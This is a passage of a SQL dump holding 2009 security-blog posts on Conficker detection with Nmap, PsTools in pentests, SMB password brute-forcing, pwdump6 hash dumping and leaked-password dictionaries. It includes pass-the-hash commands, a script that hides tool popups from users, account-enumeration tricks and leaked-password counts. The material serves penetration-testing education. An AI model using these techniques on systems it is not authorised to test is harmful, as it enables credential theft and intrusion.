denied.\r\n    |  |  If you have a login, try using --script-args=smbuser=xxx,smbpass=yyy\r\n    |  |  (replace xxx and yyy with your username and password). Also try\r\n    |  |_ smbdomain=zzz if you know the domain. (Error NT_STATUS_ACCESS_DENIED)\r\n    The other improved message is for\r\n    NT_STATUS_OBJECT_NAME_NOT_FOUND. [David]\r\n\r\no The NSEDoc portal at http://nmap.org/nsedoc/ now provides download\r\n  links from the script and module pages to browse or download recent versions\r\n  of the code.  It isn\'t quite as up-to-date as obtaining them from\r\n  svn directly, but may be more convenient. For an example, see\r\n  http://nmap.org/nsedoc/scripts/smb-check-vulns.html. [David, Fyodor]\r\n\r\no A copy of the Nmap public svn repository (/nmap, plus its zenmap,\r\n  nsock, nbase, and ncat externals) is now available at\r\n  http://nmap.org/svn/.  We\'ll be updating this regularly, but it may\r\n  be slightly behind the SVN version.  This is particularly useful\r\n  when you need to link to files in the tree, since browsers generally\r\n  don\'t handle svn:// repository links. [Fyodor]\r\n\r\no Declare a couple msrpc.lua variables as local to avoid a potential\r\n  deadlock between smb-server-stats.nse instances. [Ron]\r\n\r\nEnjoy!\r\n-Fyodor\nIf you have any other issues, please let us know (either here or, better, on the nmap-dev mailing list), and we\'ll do our best to fix them. \nHow does this check work?\nSome of you are probably wondering how this check works. Since I prefer to write technical details anyways (I\'d make a bad magician ;) ), let\'s find out! \nThere\'s a remote Windows function called NetPathCanonicalize() that can be accessed through the BROWSER service. It takes a path as a parameter, attempts to canonicalize it, and returns the canonicalized version. This function was the target of the notorious MS08-067 patch -- certain parameters could corrupt memory and crash it. \nOne of Conficker\'s primary propagation methods was this exact vulnerability -- MS08-067. In an attempt to prevent other infections, Conficker hooks NetPathCanonicalize() and effectively patches the function itself. \nBefore Microsoft released their patch, the function would either return an attempted canonicalization and no error code, or it would crash and not return at all (those are the checks I do in smb-check-vulns.nse if safechecks are disabled). After MS08-067 was applied, the evil-looking strings would return NT_STATUS_WERR_INVALID_NAME (0x7b or 123) as an error code. Conficker\'s patch, however, returns 0x57 -- an invalid error code -- and a distinct signature. \nSo what\'s this mean? It means we can send an invalid path to NetPathCanonicalize() and check the return value -- no error (or timeout) means unpatched, 0x7b means patched, and 0x57 means Conficker. \nAnd it\'s as simple as that :)\nRon', '\'Malware\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2009/updated-conficker-detection');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (108, 'Using PsTools in a pentest', 'Ron Bowes', '2009-3-31', 'I\'m going to start off this blog by wishing a happy birthday to a very important person -- me. :)\nNow, onto the content! \nPsTools is a suite of tools developed by Sysinternals (now Microsoft). They\'re a great complement to any pen test, and many of my Nmap scripts are loosely based on them. As good as they are, they aren\'t without their quirks! \nHere are a few topics worth discussing:\n\nPorts and traffic\nSpecifying an account\nRunning it purely in a console\n\nMost (possibly all) of the PsTools use standard Windows functions. That makes life easy -- we can expect PsTools to act the same way other remote functions work. If we know how!\n\nPorts and traffic\nTo me, understanding the traffic is the most important part of using a tool. And it\'s especially important if you\'re creating a netcat tunnel or something. \nSince PsTools uses standard Windows functions, we can expect it to use port 445 for all traffic. The majority of them use that port and nothing else. Simple stuff! \nAlthough PsTools are closed source, I\'ve implemented similar functionality in many of my Nmap scripts. Have a look at the smb-* scripts (included with Nmap 4.85beta4 and higher) if you want to understand the traffic more. \nSpecifying an account\nBy default, PsTools will use the account it\'s running as to connect to the remote server, including your password. So, if you\'re \'Administrator\' with the password \'Password1\', that\'s what\'ll be used by default when you run a PsTools program. That\'s helpful on a pentest -- if you exploit a system as a user account and run PsTools, you\'re effectively getting access to every system with the same password! \nYou can try this by setting up two boxes with the same username/password, logging into one, and running the following command:\nPsInfo.exe \\\\a.b.c.d\nIf you want to use a specific account, you can normally pass -u and -p parameters (for username and password). I seem to recall, however, that not all PsTools apps take those parameters (although I tested a couple quickly and they all did, so maybe I\'m lying?) \nIn any case, you can give a username and password without relying on PsTools to support it by establishing a session with the machine using the following command:\nnet use \\\\a.b.c.d\nYou\'ll be prompted for a username and password. This is similar to starting a NULL Session, except that you actually provide an account. When it\'s done, you\'ll have an authenticated SMB session over TCP. \nThen run the PsTools program as usual:\nPsInfo.exe \\\\a.b.c.d\nAnd it\'ll use the account (and, in fact, the same TCP session) you already established. When you want to terminate the session, delete it with:\nnet use \\\\a.b.c.d /del\nFinally, passing the hash with PsTools. Passing the hash takes advantage of Windows\' single-sign-on capabilities that I alluded to earlier -- the ability to log in with the local account instead of giving a full password. This is using the user\'s hash to log in (the hash of \'Password1\') instead of the password. \nBecause PsTools uses Windows\' implementation of SMB, it has to use Windows\' authentication routines. For some reason, Microsoft didn\'t want people logging in with just the hash, so that means passing the hash natively is impossible. \nFortunately, the good folks at Core Security released a tool called the Pass the Hash Toolkit. It contains a program called \"iam.exe\", which will replace your username/hash in memory with an arbitrary username/hash. Then, when you try to log in, it\'ll use the specified hash instead of your own! \nLet\'s look at an example (I\'ve removed most of the hashes for readability):\nC:\\>iam.exe -B -h administrator:domain:293b2c[...]:c35f1c[...]\nThis will copy the given username and hashes on top of the current user\'s credentials in Windows\' memory. When you use the PsTools programs now, they\'ll connect with the given username and hash. \nPsInfo.exe \\\\a.b.c.d\nRunning purely in a console\nFinally, this is the most annoying part about PsTools -- the first time you run it on a particular system, a graphical box with the EULA comes up. While it\'s great, and you should understand the EULA, it\'s incredibly inconvenient when you\'re trying to be discreet. For that reason, I put together a .bat and .reg file automatically agrees to the EULA for all PsTools programs for the current user. \nNote that by running this file, you are implicitly agreeing to the EULA for PsTools. You should only use this if you\'re trying to run the tools in console-only mode.\neulas.bat\n@echo off\r\n\r\nrem Turns off the registration agreements for the PsTools programs, so they can be used in\r\nrem a pen-test without popping up on the user.\r\nrem\r\nrem Naturally, you should familiarize yourself witht he EULAs before doing this.\r\n\r\necho Trying to import...\r\necho Running: regedit /s eulas.reg\r\nregedit /s eulas.reg\r\n\nYou\'ll also need eulas.reg\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals]\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\loggedon]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Psexec]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\psfile]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsGetSid]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsInfo]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsKill]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsList]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsLoglist]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsPasswd]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsService]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsShutdown]\r\n\"EulaAccepted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsSuspend]\r\n\"EulaAccepted\"=dword:00000001\r\n\nPut that .bat and .reg file in the same folder, run the .bat file on the commandline, then go about your pentest without worrying about the user getting a PsTools popup on their machine. \nConclusion\nThat was a quick discussion on the aspects of the PsTools suite that I\'ve always had issues with. Hopefully it\'s helpful! \nIf you have any questions on what I\'ve said here, or about PsTools\' functionality in general, please let me know. I have a pretty good understanding of how PsTools programs work, and am happy to share it. If there\'s enough demand, I\'ll even do a blog about the individual pieces of software. :)\nRon\n\"Happy birthday to me!\"\nPS: If you believe that the registry modification goes against the spirit of the PsTools EULA, or you take exception to my post, please let me know and I will modify it. I\'m not trying to upset people or provoke legal responses here :)', '\'Hacking\', \'NetBIOS/SMB\', \'Tools\'', 'https://blog.skullsecurity.org/2009/using-pstools-in-a-pentest');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (109, 'Scanning for Conficker with Nmap', 'Ron Bowes', '2009-3-30', 'Using Nmap to scan for the famous Conficker worm.\n\n<Update>\nNmap 4.85beta5 has all the scripts included, download it at http://nmap.org/download.html. \nYou\'ll still need to run a scan:\nnmap --script=smb-check-vulns --script-args=safe=1 -p445 -d <target>\n</Update>\n<Update 2>\nIf you\'re having an OpenSSL problem, read this! \nOpenSSL isn\'t included by default in the Nmap RPMs, and I wasn\'t properly checking for that in my scripts. Fyodor will have a beta5 RPM up tonight, which will fix that issue. \nUntil then, you have two options:\n1. Use a source RPM\n2. Compile straight from source, from the svn\n</Update 2>\n<Update 3>\nIf you\'re still having OpenSSL issues, try installing openssl-dev package, and install Nmap from source. Or, download the latest rpm (beta5) or svn version -- they have fixed the issue altogether (OpenSSL is no longer required!)\nFurther, if you\'re having an issue with error messages, this great post by Trevor2 might help:\n\r\nNT_STATUS_OBJECT_NAME_NOT_FOUND can be returned if the browser service is disabled. There are at least two ways that can happen:\r\n1) The service itself is disabled in the services list.\r\n2) The registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Browser\\Parameters\\MaintainServerList is set to Off/False/No rather than Auto or yes.\r\nOn these systems, if you reenable the browser service, then the test will complete.\r\n\r\nThere are probably many other reasons why NT_STATUS_OBJECT_NAME_NOT_FOUND can be returned (e.g. not a windows OS, possibly infected) but I have not confirmed these.\r\n\nFurthermore, this error will occur against on Windows NT.\n</Update 3>\nHot on the coattails of the Simple Conficker Scanner, I\'ve added detection for Conficker to Nmap. Currently, there are two ways of doing this -- you can check out the SVN version of Nmap and compile from source, or you can update the three necessary files.\n Update from SVN\nIf you\'re on a Unix-like system, this is probably the easiest way. You can install it either system-wide or in a folder. Here is the system-wide command:\n$ svn co --username=guest --password=\'\' svn://svn.insecure.org/nmap\r\n$ cd nmap\r\n$ ./configure && make\r\n$ sudo make install\r\n$ nmap --script=smb-check-vulns --script-args=safe=1 -p445 -d <target>\nIf you prefer to run it from a local folder, use the following commands:\n$ svn co --username=guest --password=\'\' svn://svn.insecure.org/nmap\r\n$ cd nmap\r\n$ ./configure && make\r\n$ export NMAPDIR=.\r\n$ ./nmap --script=smb-check-vulns --script-args=safe=1 -p445 -d <target>\nUpdate just the files\nIf you\'re on Windows, or don\'t want to compile from source, you can install the three datafiles. \nFirst, make sure you\'re running Nmap 4.85beta4. That\'s the latest beta version. Then, download this file:\n\nhttp://www.skullsecurity.org/blogdata/smb-check-vulns.nse\n\nAnd place it in the \"scripts\" folder (see below).\nThen, download these files:\n\nhttp://www.skullsecurity.org/blogdata/msrpc.lua\nhttp://www.skullsecurity.org/blogdata/smb.lua\n\nAnd place them in the \"nselib\" folder (see below). \nWhere are the folders?\nOn Linux, try /usr/share/nmap/ or /usr/local/share/nmap or even /opt/share/nmap. \nOn Windows, try c:\\program files\\nmap\nIf all else fails, the scripts folder will contain a bunch of .nse files and the nselib folder will contain a bunch of lua files. Try searching your drive for smb-check-vulns.nse and msrpc.lua, and replace those. \nConclusion\nHopefully that helps! If you have any problems or questions, don\'t hesitate to contact me! My name is Ron, and my email domain is @skullsecurity.net. \nRon', '\'Malware\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2009/scanning-for-conficker-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (110, 'Bruteforcing Windows over SMB: Tips and Tricks', 'Ron Bowes', '2009-2-20', 'Today, I\'m going to share some knowledge and techniques on bruteforcing Windows passwords. Hopefully, some of you have thought about this and can give me even more advice. If you know anything, post it!\n\nNot too long ago, I wrote a Nmap script for bruteforcing Windows passwords over SMB. Then, even more recently, I re-wrote it. Over these two editions, and with a whole lot of research about SMB in the past six months or so, I\'ve learned a lot of cool stuff. \nNot only will you get some great advice, I\'m also going to show you an example of what NOT to do, based on an actual attack against my network! Not too bad for a blog, eh?\nDisclaimer: All these techniques, except where noted, were invented by me. They may very well be used in other projects, and I\'m almost certain the obvious ones are. \nOh, and in case you don\'t know what bruteforcing is, it\'s a technique where the attacker guesses username/password combinations to gain access to a server. \nTip 1: Don\'t kill your connections\nLet\'s start with something easy, shall we? This one is pretty obvious, but it\'s worth mentioning. If you\'ve read my other blog posts, which I\'m sure you have, you\'ll know that the first three messages sent in SMB are:\nSMB_COM_NEGOTIATE\nSMB_COM_SESSION_SETUP_ANDX\nSMB_COM_TREE_CONNECT_ANDX\nAnd the last two are:\nSMB_COM_TREE_DISCONNECT\nSMB_COM_LOGOFF_ANDX\nThe magic happens in SMB_COM_SESSION_SETUP_ANDX. That\'s where the username and password are sent. If the username and password are wrong, what do you do? Hangup and call back? Nope! All you have to do is send SMB_COM_SESSION_SETUP_ANDX again. No fussing with new TCP sessions and all the extra overhead! \nHere\'s a picture (you heard that right, a picture!) of that happening:\n\nCompare that to another unnamed bruteforce program (mostly unnamed because this is one that somebody ran against me last night (I expect it was malware of some kind), which does this:\n\nThat\'s only TWO attempts! On my attack, in less space, I tried EIGHT. Something else worth pointing out is the second screenshot shows extended security negotiations, which is why you see two Session Setup requests per attempt. And that brings us to... \nTip 2: Stick with the basics\nThis is simple and obvious, much like Tip 1, but it\'s important. Take another look at the screenshots in Tip 1; notice that each login request in mine is 2 packets, compared to 4 packets in theirs (not counting the other network nonsense). Since all these login packets are roughly the same size, that means mine uses half the network traffic. On a slower network or for a long test, that could be significant. \nThe reason for the extra traffic is that Windows defaults to using extended security negotiations, or NTLMSSP. NTLMSSP is more modern, and is probably the \"proper\" way of connecting to Windows. However, all versions of Windows, at least up to Vista, still understand the old style, so why not take advantage? My Nmap libraries also default to NTLMSSP, but scripts (like smb-brute) can opt out. The issue here is that, if you\'re trying to use Windows\' libraries, you can\'t get this level of control (nor can you do the tricks from Tips 1, 3, 4, and maybe others) . \nSo, what\'s a programmer to do? In this case, the only option is to re-implement SMB. Don\'t look at me like that! I realize that implementing the whole SMB protocol is a daunting task, but keep in mind that you only need the first two packets, and the first one is static. Not so bad, eh? \nTip 3: Who has accounts here? (part 1)\nThis is probably the most confusing tip, but is also one of the most important ones. I\'ll do my best to explain it clearly, and to show some examples. Oh, and don\'t blame me for making this confusing, blame Microsoft -- Windows logins are funny, and this funniness is both a curse and a blessing. \nWhen you log into Windows, what happens when you enter an invalid username? What about an invalid password? Just access denied, right? And what if you enter the correct username and correct password? Access granted? If you answered \"yes\" to any of the above, you\'re wrong. If you answered \"no\", you\'re also wrong. The answer is, \"it depends\". \nWindows\' normal behaviour, for some definition of normal, is to deny access to invalid usernames and passwords. This is my Nmap debug output, from a Windows 2003 machine with the guest account disabled:\nsmb-brute: Server\'s response to invalid usernames: FAIL\r\nsmb-brute: Server\'s response to invalid passwords: FAIL\nSo the login failed on both attempts. Awesome, right?\nHere\'s the same scan, except that the guest account is enabled:\nsmb-brute: Server\'s response to invalid usernames: GUEST_ACCESS\r\nsmb-brute: Server\'s response to invalid passwords: FAIL\nWhat\'s going on here? Well, when the guest account is enabled, and you type an invalid username (and, obviously, invalid password), you\'re logged in as guest. If you type a valid username with an invalid password, it fails. This may appear annoying, and it is, but it\'s more often a blessing in disguise. Why? Well, here\'s the next piece of my output:\nsmb-brute: Invalid username and password response are different, so identifying \r\n  valid accounts is possible\r\nsmb-brute: Checking which account names exist (based on what goes to the \'guest\' account)\r\nsmb-brute: Invalid password for \'root\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'admin\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'administrator\' => \'FAIL\' (may be valid)\r\nsmb-brute: Invalid password for \'webadmin\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'sysadmin\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'netadmin\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'guest\' => \'SUCCESS\' (likely valid)\r\nsmb-brute: Invalid password for \'user\' -> \'GUEST_ACCESS\' (invalid account)\r\nsmb-brute: Invalid password for \'web\' => \'FAIL\' (may be valid)\r\nsmb-brute: Invalid password for \'test\' => \'FAIL\' (may be valid)\r\n\nBecause Windows is telling us something different for invalid usernames compared to invalid passwords, we can weed out which accounts actually exist! So, in that example, the \'web\', \'test\', and \'administrator\' users returned FAIL. Since we already know that invalid usernames grant us GUEST_ACCESS, and invalid passwords return FAIL, we can deduce that those three accounts exist while the rest (except, of course, for \'guest\') don\'t. Suddenly, the 10 usernames in our dictionary become three, and the whole bruteforce is going to take 30% of the original time. \nFor completeness, I\'d better say that this isn\'t the only trick when dealing with Windows. Windows XP, for example, defaults to giving guest access to every account, no matter which password is entered. Bruteforcing will completely fail in that case, but at least we always get guest access! Another little trick is that if the \'guest\' account is in another state (expired, locked out, etc), all invalid usernames will show that status. So, if guest is locked out, invalid usernames will return LOCKED_OUT instead of GUEST_ACCESS. \nTip 4: Case? Who needs case?\nThis is another very cool and useful idea trick. The idea was given to me by Brandon on the Nmap team, and filled in by Rainbow Crack. Then I improved the idea to work better with network applications. At least, I think I did (I haven\'t checked how Rainbow Crack does this). \nAs you know from reading my blogs, there are two (main) types of Windows login hashes: Lanman and NTLM. Lanman is weak, boring, and case insensitive. NTLM is strong, boring, and case sensitive. When logging into Windows, you can use one, the other, or both, Windows doesn\'t care. \nDisclaimer: Vista no longer stores Lanman, so Vista cares. \nTaking advantage of case sensitivity, smb-brute will start by using pure Lanman (unless it detects Vista or is overridden by the user). Once it finds a password, it flips to NTLM, where it tries the password again. If it fails, then the password has uppercase characters in it. The script will then switch over to case discovery, where it\'ll try every combination of upper and lowercase until it finds the proper NTLM password. This takes 2length tries, at the worst case. So, a 14-character password will take 214 or 16,384 guesses at the worst case. That\'s pretty bad, but not terrible. There are, however, a few mitigating factors. The first one, of course, is that nobody with a 14-character password is going to be using a dictionary password, so we won\'t be finding it anyways. More than likely, the longest password you\'ll crack is an 8-character password, which is 28 or 256 checks at the worst case. Much better! \nUp to here, this idea is straight from Rainbow Crack. This is where I add a twist to it. Rainbow Crack has the advantage of running locally on the system, so 16,000 checks isn\'t actually unreasonable. smb-brute, however, has to run on the network, making efficiency important. Well, let\'s figure out how people most commonly use case in their passwords, shall we? From the passwords stolen from MySpace a couple years back, here are a few quick statistics (disclaimer: these are for phished passwords that contain only letters):\n4918 -- All lowercase\n1623 -- All uppercase\n59 -- One uppercase\n6 -- Two uppercase\n7 -- Three uppercase\n1 -- Four uppercase\n1 -- Five uppercase\n0 -- Six uppercase\n0 -- Seven uppercase\netc.\nObviously, the statistics for >1 uppercase exclude strings that are entirely uppercase. \nFrom these statistics, the trend is pretty obvious (and, interestingly, this is exactly the trend I predicted and implemented before I ever looked at statistics :) ) -- most people use all lower, all upper, or a minimal number of uppercase characters. Another assumption that I haven\'t actually tested yet is that the uppercase characters tend to be closer to the front of the string, because a lot of people capitalize the first letter. So, with this in mind, I implemented an algorithm that generates a list of passwords in that order. For example, the password \"test\" would have the following permutations, in this order:\ntest\nTEST\nTest\ntEst\nteSt\ntesT\nTEst\nTeSt\nTesT\ntESt\ntEsT\nteST\nTESt\nTEsT\nTeST\ntEST\nI wrote this by converting the case representation (upper/lower) to binary (1/0) (for example, \'1000\' represents \'Test\' and \'1011\' represents \'TeST\'). Then, all possible binary numbers between 0 and 2strlen - 1 are sorted by the number of ones they contain. So, the strings with a single capital (one \'1\') ended up at the top, and the strings with all caps (four \'1\'s) ended up at the bottom, like this:\n0000\n1000\n0100\n0010\n0001\n1100\n1010\n1001\n0110\n0101\n0011\n1110\n1101\n1011\n0111\n1111\nAfter the \'1111\' is moved to second place (all caps is special and breaks the pattern), these are converted back to letters, and the passwords are tested. \nsmb-brute: Determining password\'s case (mixcase:butterfly1)\r\nsmb-brute: Result: mixcase:BuTTeRfLY1\nTip 5: Who has accounts here? (part 2)\nHopefully by now, we\'ve trimmed down the list of accounts to valid ones, then found the passwords of a couple of those. The problem is, on my machines, I have weird usernames. What are the odds that \"test7\", \"consoletest\", and \"mixcase\" are going to be in your bruteforce list? Pretty small. \nBut, there\'s hope! If you have a fully blown SMB implementation with MSRPC, as soon as you have a guest (or, better, user) password, you can start enumerating users. If you\'ve been keeping up with my scripts, you\'ll know that smb-enum-users.nse does exactly that. So, borrowing a few tricks from that script, as soon as smb-brute.nse is able, it performs a user enumeration. On Windows 2000, or Windows XP and higher with \'guest\' enabled, it will get the list of users immediately. If guest is disabled on Windows XP or higher system, it won\'t get the list until it finds an actual account. \nOnce we have a proper username list, the possibility of success increases dramatically, especially if the server has a significant number of user accounts. \nHere is some output to demonstrate:\nsmb-brute: Couldn\'t enumerate users (normal for Windows XP and higher), using unpwdb initially\r\n[...]\r\nsmb-brute: Determining password\'s case (test:password1)\r\nsmb-brute: Result: test:password1\r\nSMB: Extended login as \\test succeeded\r\nSMB: Saved an aministrative account: test\r\nsmb-brute: Trying to get user list from server using newly discovered account\r\nSMB: Login as \\test succeeded\r\nsmb-brute: Found 19 accounts to check!\r\nsmb-brute: Checking which account names exist (based on what goes to the \'guest\' account)\r\nsmb-brute: Invalid password for \'administrator\' => \'FAIL\' (may be valid)\r\nsmb-brute: Invalid password for \'allupper\' => \'FAIL\' (may be valid)\r\n[...]\r\n\nTip 6: Passwords first, users can wait\nThis is a great idea, proposed by Brandon. My original script looped through each username, then each password for that user. Since most of my password dictionaries are sorted by frequency of use, the first username would be paired with every password, from the most common to the least common. Then the next username would be paired the same way, and so on. With a large password dictionary, each user would take a long time. \nBrandon\'s idea was to start with a password, and try every possible user for it. That means that the most common password (say, \'password1\'), will be tried for every account before the next password (say, \'abc123\') is tried. \nThis is great, and will find common passwords much faster. But what are the disadvantages?\nWell, the biggest disadvantage I ran across is that, if the server enforces account lockouts, then all accounts will be brought to within one guess from being locked out. That can cause a DoS on a server pretty fast, especially if the script is run a second time. That bring us to...\nTip 7: The canary warned us!\nLet\'s say there are three users, \"ron\", \"jim\", and \"mary\", and the system locks people out at 3 failed logins. The test will look like this:\nron:(random garbage) => fail\njim:(random garbage) => fail\nmary:(random garbage) => fail\nron:abc123 => fail\njim:abc123 => fail\nmary:abc123 => fail\nron:iloveyou => fail (+ locked out)\n(quit)\nThe reason for the initial random password is to check whether or not the account exists and, if it exists, whether or not it\'s locked out or disabled. If the script is run a second time, in the phase that checks for accounts\' existence, every account will be locked. For a pen-tester, that isn\'t ideal. And if the server\'s being actively used, that\'s also bad because a user might mistype their password once (I pretty much always do) before logging in. \nTo mitigate this issue, I came up with what I consider to be a clever trick. Remember, though, that just because I think it\'s clever, doesn\'t make it clever. Anyway, at the beginning of the scan, the first valid-looking account found has a number of random passwords attempted. I call the account the canary, after the traditional (and horrible ;) ) practice of bringing a canary with miners to see if it dies. By default, three probes are sent, but it\'s configurable with commandline arguments. If the account is locked on the first three probes, the scan ends right away. That\'s easy. But let\'s say the lockout threshold has been set to six? This is what\'ll happen:\nron:(random garbage) => fail [testing initial state]\njim:(random garbage) => fail [testing initial state]\nmary:(random garbage) => fail [testing initial state]\nron:(random garbage) => fail [canary]\nron:(random garbage) => fail [canary]\nron:(random garbage) => fail [canary]\nron:password1 => fail\njim:password1 => fail\nmary:password1 => fail\nron:abc123 => fail (+ locked out)\nThe canary is locked out, but the counters for the other accounts are still 2 -- well below the lockout threshold. One account is still locked out, but that\'s far better than every account being locked out. \nTip 8: What\'s your access level?\nThat brings us to our final tip: how to determine access level?\nsmb-brute.nse saves its credentials, but how do we know which credentials to save? What if we save the guest account when a bunch of administrator accounts were discovered? \nI wrestled with this problem for a little while, since I didn\'t know of any way to get a user\'s groups remotely. It wouldn\'t surprise me if there was a LSA function to do it, but I didn\'t dig that deep. Instead, I originally checked if username == \"Administrator\" then keep, and if username == \"Guest\" then reject. Not an ideal solution, and I wanted something better. \nThat\'s when I realized, a simple way to tell them apart is to do something that only one can do! In my current version of smb.lua, when a user tries to save a name, it tries to get the server\'s statistics (the same way as smb-server-stats.nse). If it succeeds, it\'s administrator; otherwise, it\'s user or lower. This technique works great against all Windows up to (not including) Vista. Here is an example run, where \'test\' is an Administrator and Windows 2003 is the target:\nsmb-brute: Detecting server lockout on \'allupper\' with 3 canaries\r\nsmb-brute: Determining password\'s case (blankadmin:)\r\nsmb-brute: Result: blankadmin:\r\nsmb-brute: Determining password\'s case (blankuser:)\r\nsmb-brute: Result: blankuser:\r\nsmb-brute: Determining password\'s case (guest:)\r\nsmb-brute: Result: guest:\r\nsmb-brute: Determining password\'s case (test:password1)\r\nsmb-brute: Result: test:password1\r\nSMB: Extended login as \\test succeeded\r\nSMB: Saved an aministrative account: test\r\n...\r\n\nIn my next version, I plan to look into other functions that require administrative privileges to run; one promising function is GetShareInfo() (the function that retrieves information about a share, such as the path). I believe it\'ll work better than GetServerStats(). \nConclusion\nAs I said, while taking pokes at SMB authentication, I discovered a lot of cool tricks. I listed all eight things I considered significant and used to my advantage. Hopefully they either come in handy to somebody or, more likely, hopefully you found this interesting! If you made it all the way to the end, you must think it\'s something. :)', '\'Hacking\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2009/bruteforcing-windows-tips-and-tricks');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (111, 'How Pwdump6 works, and how Nmap can do it', 'Ron Bowes', '2009-2-9', 'Today I want to discuss how the pwdump6 and fgdump tools work, in detail, and how I was able to integrate pwdump6 into my Nmap scripts. Is this integration useful? Maybe or maybe not, but it was definitely an interesting problem.\n\nThe Nmap script in question is called smb-pwdump.nse, and currently exists in my experimental branch. It can be checked out using the following command:\nsvn co -r12061 svn://svn.insecure.org/nmap-exp/ron/nmap-smb\n(Username \'guest\', no password)\nAnd run like this:\nnmap --script=smb-pwdump --script-args=smbuser=<username>,smbpass=<password> -p139,445 <host>\nThe Nmap script uses pwdump6\'s executable files, servpw.exe and lsremora.dll. These aren\'t included with Nmap, but have to be downloaded from pwdump6\'s Web site. Since these files can trigger antivirus software, care should be taken with them. Recompiling them from source is a great way to avoid antivirus software. They need to be put in the nselib/data directory, wherever that happens to be. \npwdump6 and fgdump both attempt to download the password hashes from a remote machine. These password hashes are actually password equivalent, so they can be used to log into another system directly. They are also incredibly easy to crack, and can be cracked (that is, converted back to the password text) using a tool such as Rainbow Crack. \nOn a high level, both pwdump6 and fgdump access the service control service (SVCCTL). It gives users the ability to create, start, stop, and delete services on the remote machine. The service control service is being used to run a process on the remote machine -- it\'s also used by tools like psexec to execute remote programs. \nPwdump6 and smb-pwdump.nse both perform the following actions:\n\nEstablish a connection to the target system\nUpload servpw.exe and lsremora.dll to a file share\n\nUses standard SMB file writing functions\n\nCreate and start a service (servpw.exe) using SVCCTL functions\n\nUses the following SVCCTL functions:\nOpenSCManagerW()\nCreateServiceW()\nStartServiceW()\nQueryServiceW() (to check when the service starts)\n\nRead and decrypt the data from the service (it writes to a named pipe using Blowfish encryption, which can be read remotely)\n\nThe service writes encrypted data to a named pipe; smb-pwdump.nse reads and decrypts that data\n\nStop the service and remove the files\n\nOpenServiceW()\nStopService()\nAnd standard SMB functions for deleting the file\n\n\nObviously, this process is highly intrusive (and requires administrative privileges). It\'s running a service on the remote machine with SYSTEM-level access, and the service itself injects a library into LSASS.\nWhen I wrote the Nmap script, I focused more on cleanup than anything else. Before and after the script runs, a cleanup routine will attempt to delete the files and stop the service. As a result, I can\'t randomize the file or service name (otherwise, it wouldn\'t know what to clean), so it\'s more likely to be caught by antivirus or IDS software than, say, fgdump, whose sole purpose is to evade detection. The names can easily be changed by editing the source, if you want to be more careful. You probably don\'t even need the .exe extension on servpw.exe. If you change the name of lsremora.dll, you\'ll have to recompile servpw.exe with the new lsremora.dll name. \nFor me, this script was written mostly as an academic exercise, and to highlight Nmap\'s growing potential as a pentesting tool. It compliments the smb-brute.nse script, also written by me, because smb-brute.nse can find weak administrator passwords, then smb-pwdump.nse can use those passwords to dump hashes. Those hashes can then be cracked and added to the password list for more brute forcing. The hashes themselves can also be added to Nmap\'s password list, since smb-brute.nse understands how to use hashes. Future plans include automatically using discovered hashes against other systems.\nSo that\'s smb-pwdump.nse! Let me know what you think (or if you even read my blog :P) in a comment!', '\'Hacking\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2009/how-pwdump6-works-and-how-nmap-can-do-it');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (112, 'More password dictionaries', 'Ron Bowes', '2009-2-7', 'Last month, I posted about some password dictionaries I\'ve collected. Well, thanks to a hacker who compromised PHPBB\'s site, I added another. There\'s a big caveat to this one, though -- these passwords are apparently based on ones that were cracked by the hacker, so they\'re only an accurate representation of weak passwords.\n\nThat being said, weak passwords are what most pen-testers are targeting, so it can be useful. \nFeel free to take a look at the list, with and without associated counts. I\'m not going to post the list with the usernames intact, because that doesn\'t do any good for my purposes. \nFor fun, I did a grep of the password list for some common passwords. Have a look:\n$ cat phpbb-counts.txt | grep -i password\r\n    609 password\r\n     11 password1\r\n      9 PASSWORD\r\n      7 Password\r\n      6 mypassword\r\n      6 1password\r\n      4 nopassword\r\n      2 thisismypassword\r\n      2 random password\r\n      2 passwords\r\n      2 password2\r\n      2 password123\r\n      2 newpassword\r\n      1 thepassword\r\n      1 password\\n\r\n      1 